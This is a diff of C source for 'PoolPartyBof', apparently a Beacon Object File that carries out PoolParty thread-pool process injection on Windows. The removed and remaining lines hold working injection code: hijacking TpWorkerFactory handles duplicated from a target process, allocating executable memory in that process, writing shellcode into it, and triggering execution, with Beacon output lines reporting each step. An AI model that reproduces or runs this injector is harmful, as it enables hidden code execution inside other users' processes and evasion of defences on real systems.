@@ -1,114 +1,15 @@
 #include <windows.h>
 #include "PoolPartyBof.h"
-#include "beacon.h"
-
-WINBASEAPI void *__cdecl MSVCRT$realloc(void *_Memory, size_t _NewSize);
-WINBASEAPI wchar_t *__cdecl MSVCRT$wcscmp(const wchar_t *_lhs,const wchar_t *_rhs);
-WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess (VOID);
-WINBASEAPI BOOL WINAPI KERNEL32$DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
-WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
-WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
-WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
-WINBASEAPI PTP_TIMER  WINAPI KERNEL32$CreateThreadpoolTimer( PTP_TIMER_CALLBACK pfnti, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
 
 
-HANDLE m_p_hTargetPid = NULL;
-DWORD m_dwTargetPid = 0;
-PVOID m_ShellcodeAddress = NULL;
 HANDLE m_p_hWorkerFactory = NULL;
 HANDLE m_p_hTimer = NULL;
-unsigned char * m_cShellcode = NULL;
-int m_szShellcodeSize = 0;
 
-BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
-	_NtQueryObject NtQueryObject = (_NtQueryObject)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject"));
-	ULONG InformationLength = 0;
-	NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
-	BYTE* Information = NULL;
-
-	do {
-		Information = (BYTE*)MSVCRT$realloc(Information, InformationLength);
-		Ntstatus = NtQueryObject(x, y, Information, InformationLength, &InformationLength);
-	} while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);
-
-	return Information;
-}
-
-HANDLE HijackProcessHandle(PWSTR wsObjectType ,HANDLE p_hTarget, DWORD dwDesiredAccess) {
-	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"));
-	
-	BYTE* Information = NULL;
-	ULONG InformationLength = 0;
-	NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
-
-	do {
-		Information = (BYTE*)MSVCRT$realloc(Information, InformationLength);
-		Ntstatus = NtQueryInformationProcess(p_hTarget, (PROCESSINFOCLASS)(ProcessHandleInformation), Information, InformationLength, &InformationLength);
-	} while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);
-	
-	
-	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(Information);
-	
-	HANDLE p_hDuplicatedObject;
-	ULONG InformationLength_ = 0;
-
-	for (int i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {
-		KERNEL32$DuplicateHandle(
-			p_hTarget,
-			pProcessHandleInformation->Handles[i].HandleValue,
-			KERNEL32$GetCurrentProcess(), 
-			&p_hDuplicatedObject,
-			dwDesiredAccess,
-			FALSE,
-			(DWORD_PTR)NULL);
-
-		BYTE* pObjectInformation;
-		pObjectInformation = NtQueryObject_(p_hDuplicatedObject, ObjectTypeInformation);
-		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)(pObjectInformation);
-
-		if (MSVCRT$wcscmp(wsObjectType, pObjectTypeInformation->TypeName.Buffer) != 0) {
-			continue;
-		}
-
-		return p_hDuplicatedObject;
-	}
-}
 
 HANDLE HijackWorkerFactoryProcessHandle(HANDLE p_hTarget) {
 	return HijackProcessHandle((PWSTR)L"TpWorkerFactory\0", p_hTarget, WORKER_FACTORY_ALL_ACCESS);
 }
 
-LPVOID AllocateShellcodeMemory() {
-	LPVOID ShellcodeAddress = KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, m_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if (ShellcodeAddress == NULL) {
-		BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Something went wrong");
-		return NULL;
-	}
-	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Allocated shellcode memory in the target process: %p", ShellcodeAddress);
-	return ShellcodeAddress;
-}
-
-HANDLE GetTargetProcessHandle() {
-	HANDLE p_hTargetPid = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, m_dwTargetPid);
-	if (p_hTargetPid == NULL) {
-		return NULL;
-	}
-	else {
-		BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Retrieved handle to the target process: %p", p_hTargetPid);
-		return p_hTargetPid;
-	}
-}
-
-BOOL WriteShellcode() {
-	BOOL res = KERNEL32$WriteProcessMemory(m_p_hTargetPid, m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize, NULL);
-	if (res == 0) {
-		return FALSE;
-	}
-	else{
-		BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Written shellcode to the target process");
-		return TRUE;
-	}
-}
 
 HANDLE GetTargetThreadPoolWorkerFactoryHandle() {
 	HANDLE p_hWorkerFactory = HijackWorkerFactoryProcessHandle(m_p_hTargetPid);
@@ -197,7 +98,7 @@ void Inject() {
 		return;	
 	}
 	SetupExecution();
-	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	PoolParty attack completed successfully");
+	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	PoolParty attack completed.");
 }
 
 void go(char * args, int len) {
